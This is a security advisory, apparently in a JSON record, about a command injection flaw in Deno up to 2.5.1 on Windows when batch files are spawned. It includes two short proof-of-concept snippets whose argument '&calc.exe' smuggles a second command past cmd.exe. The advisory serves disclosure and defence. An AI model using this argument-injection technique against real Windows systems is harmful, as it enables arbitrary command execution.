  "summary": "Deno is Vulnerable to Command Injection on Windows During Batch File Execution",
  "details": "### Summary\nDeno versions up to 2.5.1 are vulnerable to Command Line Injection attacks on Windows when batch files are executed.\n\n### Details\nIn Windows, ``CreateProcess()`` always implicitly spawns ``cmd.exe`` if a batch file (.bat, .cmd, etc.) is being executed even if the application does not specify it via the command line. This makes Deno vulnerable to a command injection attack on Windows as demonstrated by the two proves-of-concept below.\n\n### PoC\nUsing `node:child_process` (with the `env` and `run` permissions):\n```JS\nconst { spawn } = require('node:child_process');\nconst child = spawn('./test.bat', ['\u0026calc.exe']);\n```\nUsing `Deno.Command.spawn()` (with the `run` permission):\n```JS\nconst command = new Deno.Command('./test.bat', {\n  args: ['\u0026calc.exe'],\n});\nconst child = command.spawn();\n```\n\n### Impact\nBoth of these scripts result in opening calc.exe on Windows, thus allowing a Command Line Injection attack when user-provided arguments are passed if the script being executed by the child process is a batch script.",
